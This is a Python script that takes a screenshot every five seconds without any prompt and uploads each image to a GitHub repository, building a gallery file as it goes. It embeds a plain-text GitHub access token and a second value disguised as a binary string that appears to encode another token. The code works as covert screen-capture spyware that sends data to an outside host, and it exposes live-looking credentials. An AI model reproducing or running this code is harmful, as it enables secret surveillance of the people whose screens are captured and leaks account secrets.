from datetime import datetime
from github import Github
import pyscreenshot as sc 
import io 
import time


bri = "01100111 01101000 01110000 01011111 01001111 01110000 01110100 01110101 00110011 01101011 01110110 01110100 01010110 01010101 01111010 01100100 00110001 01010110 01100101 01100011 01110010 01101001 01000001 00110101 01000101 01011000 01000011 00110011 01100010 01000100 00110111 01100010 01010110 01100001 00110011 01110001 01001001 01101101 01101111 00110100"
rn = "uwername/Saves"


g = Github('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')

repo = g.get_repo(rn)

print(f"Con")

while True:
    try:
        
        img = sc.grab()
        
       
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        content = img_byte_arr.getvalue()
        
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"screen_{timestamp}.png"
        path_in_repo = f"images/{filename}"

       
        repo.create_file(path_in_repo, f"Upload {filename}", content)
        print(f"up: {filename}")

  
        try:
            new_entry = f'<a href="{path_in_repo}"><img src="{path_in_repo}" width="300" style="margin: 5px; border: 1px solid #ddd;"/></a>\n'

            try:
           
                gallery_file = repo.get_contents("GALLERY.md")
                old_content = gallery_file.decoded_content.decode("utf-8")
                
               
                updated_content = new_entry + old_content
                
                
                repo.update_file("GALLERY.md", f"Add {filename}", updated_content, gallery_file.sha)
                
            except:
                
                header = "# My Screenshots\nClick any image to see full size.\n\n"
                repo.create_file("GALLERY.md", "Init Gallery", header + new_entry)
            
            print("GU")
            
        except Exception as gal_error:
            print(f"GAL E: {gal_error}")

    except Exception as e:
        print(f"CRIT Er: {e}")

 
    time.sleep(5)